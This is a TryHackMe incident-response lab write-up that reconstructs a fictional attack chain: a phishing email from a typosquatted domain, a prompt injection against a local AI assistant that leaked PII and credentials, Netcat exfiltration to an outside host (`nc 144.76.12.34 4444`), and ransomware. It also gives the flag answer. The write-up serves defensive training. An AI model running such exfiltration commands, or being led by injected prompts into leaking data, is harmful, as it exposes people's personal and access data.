# 🖥️ ContAInment — TryHackMe Write-up

| Field        | Detail                          |
|--------------|---------------------------------|
| **Operator** | W3bW1z4rd                       |
| **Date**     | 2026-06-14                      |
| **Platform** | TryHackMe                       |
| **Category** | Incident Response / DFIR        |
| **Target**   | West Tech Workstation `10.64.132.96` |
| **User**     | o.deer (Oliver Deer)            |
| **Flag**     | `thm{23,82,20,17,53}`           |

---

## Executive Summary

An incident response investigation was conducted on the workstation of senior researcher **Oliver Deer** following the discovery of a ransom note (`pwned.txt`) and signs of data exfiltration. The investigation identified a **multi-stage attack** involving:

- Phishing via typosquatted domain
- Prompt injection against a local AI assistant (`WestTechBot.py`)
- Data theft via Netcat
- Encryption of sensitive project files (ransomware)

The final flag was recovered by decrypting an encrypted archive using a password found in the exfiltrated data stream.

---

## Phase 1: Initial Triage

### Ransom Note Analysis

`~/Desktop/pwned.txt` revealed the attacker alias: **~rootedReaper**

**Threat Intelligence extracted from note:**

| Item | Detail |
|------|--------|
| Entry vector | Malicious email attachment |
| Technique | Prompt injection against local AI (`WestTechBot.py`) |
| Data stolen | PII + internal access credentials |
| Ransom demand | 0.853 BTC |
| Deadline | 48 hours |

### System State

- No malicious processes currently running
- Login history: `o.deer` from `192.168.128.249` (internal), `ubuntu` from `10.9.98.230` (suspicious)
- No browser history available (Chrome/Firefox paths empty)

---

## Phase 2: Evidence Discovery

### Exfiltration Log

`~/alarms/soc_alarms/2025-06-17/exfiltration_detected_1.log` confirmed unauthorized outbound traffic:

| Field       | Value           |
|-------------|-----------------|
| Executable  | `/bin/nc` (Netcat) |
| Destination | `144.76.12.34`  |
| Port        | `4444`          |
| Data Volume | 181,923 bytes (~178 KB) |
| Date        | 2025-06-17      |

### Artefacts

| Artefact | Path | Notes |
|----------|------|-------|
| Encrypted archive | `~/westtech_projects_encrypted.zip` | Created 2025-06-18, 8 KB |
| PCAP dump | `~/Documents/pcap_dumps/2025-06-17/session_4444_dump.pcap` | Contains raw AI interaction + exfil stream |
| Phishing email | `~/Mail/2025-06-17_invoice_required_review.eml` | Typosquatted sender |

### Phishing Email

```
Subject:  INVOICE - URGENT REVIEW REQUIRED
Sender:   billing@westteck-payments.com   ← typosquatting westteck vs westtech
Attachment: invoice_payload.scr
```

---

## Phase 3: Attack Chain Reconstruction

```
[Phishing Email]
      │
      ▼
[invoice_payload.scr executed by o.deer]   ← Initial Access (2025-06-17)
      │
      ▼
[WestTechBot.py — Prompt Injection]        ← AI Memory Leak
      │  Attempt #3: "Misdirection" technique succeeded
      │
      ▼
[Data Extracted via AI]
      │  PII: Name, DOB, Address, Phone, Salary, Medical Info
      │  Internal: Firmware upload service, telemetry debug console, staging SFTP
      │
      ▼
[nc 144.76.12.34 4444]                     ← Exfiltration (~178 KB)
      │  Captured in session_4444_dump.pcap
      │
      ▼
[westtech_projects_encrypted.zip]          ← Ransomware/Encryption (2025-06-18)
```

---

## Phase 4: Forensic Analysis & Flag Recovery

### Step 1 — Analyzing the AI Memory Leak

The ransom note stated:
> *"Your AI was very helpful. Unfortunately, it also has a big mouth. Might want to patch that memory leak."*

The lab's `pcap_file_reassembler` tool was used to reconstruct the exfiltrated data stream:

```
Tool: pcap_file_reassembler
Input: /home/o.deer/Documents/pcap_dumps/2025-06-17/session_4444_dump.pcap
Output: /home/o.deer/qwen-output/reassembled_data_dump.txt
```

### Step 2 — Extracting the Password

Reviewing `reassembled_data_dump.txt` revealed the attacker's notes embedded in the exfil stream:

```
Extracted Memory Contents
...
Dont lose this lol or Ill have no leverage westtechvictim1
```

**Recovered password:** `westtechvictim1`

### Step 3 — Decrypting the Archive

```bash
unzip -P westtechvictim1 ~/westtech_projects_encrypted.zip
```

**Archive contents:**

```
vault_tek_collab_agenda.doc
internal_security_incident_233.json
thm_flags.txt                   ← target
prototype_plasma_launcher_test_logs.log
email_export_april2025.eml
thm_flags_guide.txt
project_chimera_specs.txt
fusion_cell_mk3_blueprints.pdf
```

### Step 4 — Solving the Flag Puzzle

`thm_flags.txt` contains **200 lines** of Base64-encoded strings. Each decodes to a `thm{a,b,c,d,e}` format. The lab's `liberty_prime` tool hinted: **the correct flag contains exactly three prime numbers.**

**Sample decode:**
```
dGhtezUyLDY1LDE3LDk1LDE0fQ==  →  thm{52,65,17,95,14}
```

Python script to find the flag:

```python
import base64

def is_prime(n):
    if n <= 1: return False
    if n <= 3: return True
    if n % 2 == 0 or n % 3 == 0: return False
    i = 5
    while i * i <= n:
        if n % i == 0 or n % (i + 2) == 0:
            return False
        i += 6
    return True

with open('home/o.deer/westtech_projects/thm_flags.txt') as f:
    for line in f:
        line = line.strip()
        try:
            decoded = base64.b64decode(line).decode('utf-8')
            nums = [int(x) for x in decoded.strip('thm{}').split(',')]
            prime_count = sum(1 for n in nums if is_prime(n))
            if prime_count == 3:
                print(f"FOUND: {decoded}  (Primes: {prime_count})")
        except:
            pass
```

**Output:**
```
FOUND: thm{23,82,20,17,53}  (Primes: 3)
```

> Primes confirmed: **23** ✓ &nbsp; **17** ✓ &nbsp; **53** ✓

---

## 🚩 Final Flag

```
thm{23,82,20,17,53}
```

---

## Recommendations

| Priority | Finding | Recommendation |
|----------|---------|----------------|
| 🔴 Critical | `WestTechBot.py` prompt injection | Implement input sanitization and output filtering; restrict memory/context access |
| 🔴 Critical | Phishing — typosquatted domain | Stricter email filtering; DMARC/SPF enforcement; user awareness training |
| 🟠 High | Netcat outbound to unknown IP | Block `nc` egress at firewall; alert on raw TCP beacons to untrusted IPs |
| 🟠 High | Mass PII exfiltration | Implement DLP controls; monitor for bulk file reads + outbound data spikes |
| 🟡 Medium | No browser history | Enforce centralized logging; ensure forensic artefacts are retained |

---

*Write-up by [W3bW1z4rd](https://github.com/Technoanon) · TryHackMe*
